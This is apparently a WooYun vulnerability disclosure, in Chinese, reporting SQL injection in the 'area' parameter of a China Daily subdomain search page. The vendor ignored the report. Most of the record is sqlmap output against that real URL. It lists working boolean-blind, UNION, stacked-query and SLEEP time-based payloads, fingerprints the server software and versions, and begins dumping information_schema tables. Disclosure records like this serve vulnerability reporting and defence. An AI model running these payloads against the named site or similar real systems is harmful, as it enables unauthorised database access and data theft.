wybug_title: 中国日报某分站sql注入一枚#数据库泄漏
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-12-15：	细节已通知厂商并且等待厂商处理中									2014-12-20：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  某分站注入一枚 导致数据库泄漏 详细说明：   

注入地址http://ichuguo.chinadaily.com.cn/search?query=%E8%BF%AA%E6%8B%9C&area=100   漏洞证明：  注入地址 ：http://ichuguo.chinadaily.com.cn/search?query=%E8%BF%AA%E6%8B%9C&area=100    修复方案：  国际惯例  sqlmap identified the following injection points with a total of 268 HTTP(s) requests:---Place: GETParameter: area    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: query=%E8%BF%AA%E6%8B%9C&area=100' AND 5442=5442 AND 'ubBV'='ubBV    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: query=%E8%BF%AA%E6%8B%9C&area=-8438' UNION ALL SELECT NULL,CONCAT(0x7162767a71,0x46546d766d4676707141,0x716a756571),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: query=%E8%BF%AA%E6%8B%9C&area=100'; SELECT SLEEP(5)--     Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: query=%E8%BF%AA%E6%8B%9C&area=100' AND SLEEP(5) AND 'fqTd'='fqTd---web application technology: Apache 2.4.7, PHP 5.5.10back-end DBMS: MySQL 5.0.11Database: information_schema[59 tables]+---------------------------------------+| CHARACTER_SETS                        || COLLATIONS                            || COLLATION_CHARACTER_SET_APPLICABILITY || COLUMNS                               || COLUMN_PRIVILEGES                     || ENGINES                               || EVENTS                                || FILES                                 || GLOBAL_STATUS                         || GLOBAL_VARIABLES                      || INNODB_BUFFER_PAGE                    || INNODB_BUFFER_PAGE_LRU                || INNODB_BUFFER_POOL_STATS              || INNODB_CMP                            || INNODB_CMPMEM      || INNODB_FT_CONFIG                      || INNODB_FT_DEFAULT_STOPWORD            || INNODB_FT_DELETED                     || INNODB_FT_INDEX_CACHE                 || INNODB_FT_INDEX_TABLE                 || INNODB_LOCKS                          || INNODB_LOCK_WAITS                     || INNODB_METRICS                        || INNODB_SYS_COLUMNS                    || INNODB_SYS_DATAFILES wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-20 17:12 厂商回复：  最新状态： 暂无
